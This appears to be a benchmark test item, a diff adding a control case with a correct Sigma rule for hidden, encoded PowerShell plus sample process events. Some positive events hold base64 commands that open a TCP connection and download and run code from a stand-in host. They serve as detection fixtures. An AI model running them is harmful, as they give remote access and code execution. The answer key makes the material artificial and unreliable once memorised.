@@ -1,0 +1,155 @@
+id: CTL1-08
+role: control
+defect_class: NONE
+evasive: false
+why: 'Correct rule: tag T1059.001 is valid, all values including the ccmexec.exe exclusion are quoted
+  in the evidence, an encoded command AND a hidden window are both required (short and long spellings
+  via windash), and encoding-only, hidden-only and SCCM look-alikes do not match.'
+expected_gate: none
+report_text: 'The loader executed its payload through hidden, encoded PowerShell. The captured command
+  line was powershell.exe -nop -w hidden -enc followed by about 300 characters of base64, launched from
+  a scheduled task, and later waves used the long forms -WindowStyle Hidden and -EncodedCommand on powershell.exe
+  or pwsh.exe. A hidden window combined with an encoded command is the pairing attackers use to avoid
+  a visible console and to conceal the script text. Configuration Manager is a known benign source: ccmexec.exe
+  starts powershell.exe with -EncodedCommand and -WindowStyle Hidden for compliance baselines, so processes
+  launched by ccmexec.exe should be excluded. Detection should require both an encoded command and a hidden
+  window.'
+evidence:
+- The captured command line was powershell.exe -nop -w hidden -enc followed by about 300 characters of
+  base64
+- later waves used the long forms -WindowStyle Hidden and -EncodedCommand on powershell.exe or pwsh.exe
+- ccmexec.exe starts powershell.exe with -EncodedCommand and -WindowStyle Hidden for compliance baselines
+logsource: windows_process_creation
+techniques:
+- T1059.001
+sigma_yaml: |
+  title: Hidden Window Encoded PowerShell Command
+  id: d273e185-a4b9-40d2-b668-93e5b4068108
+  status: experimental
+  description: 'Detects powershell.exe or pwsh.exe started with both an encoded command and a hidden window style, excluding Configuration Manager.'
+  references:
+    - 'urn:atidep:case'
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.execution
+    - attack.t1059.001
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection_img:
+      Image|endswith:
+        - '\powershell.exe'
+        - '\pwsh.exe'
+    selection_enc:
+      CommandLine|windash|contains: '-enc'
+    selection_hidden:
+      CommandLine|windash|contains:
+        - '-w hidden'
+        - '-WindowStyle Hidden'
+    filter_sccm:
+      ParentImage|endswith: '\ccmexec.exe'
+    condition: selection_img and selection_enc and selection_hidden and not filter_sccm
+  falsepositives:
+    - 'Other management agents that start encoded hidden PowerShell and are not listed here'
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMAAiACwANAA0ADQANAApAA==
+    parent: C:\Windows\System32\wscript.exe
+    parent_cmd: wscript.exe //B C:\Users\alice\AppData\Local\Temp\inv.js
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell -WindowStyle Hidden -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADEAMAAvAHMAJwApAA==
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe /c
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Program Files\PowerShell\7\pwsh.exe
+    cmd: pwsh.exe -WindowStyle Hidden -NoProfile -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAYQBsAGMALgBlAHgAZQA=
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\cmd.exe
+    cmd: cmd.exe /c ipconfig /all
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Users\alice\AppData\Local\Microsoft\Teams\current\Teams.exe
+    cmd: Teams.exe --processStart
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\schtasks.exe
+    cmd: schtasks /query /fo LIST
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAdABvAHAAJwA=
+    parent: C:\Windows\CCM\CcmExec.exe
+    parent_cmd: C:\Windows\CCM\CcmExec.exe
+    user: NT AUTHORITY\SYSTEM
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Scripts\backup.ps1
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -WindowStyle Hidden -File C:\Scripts\trayicon.ps1
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -Command "Get-Content C:\Logs\app.log -Encoding utf8"
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
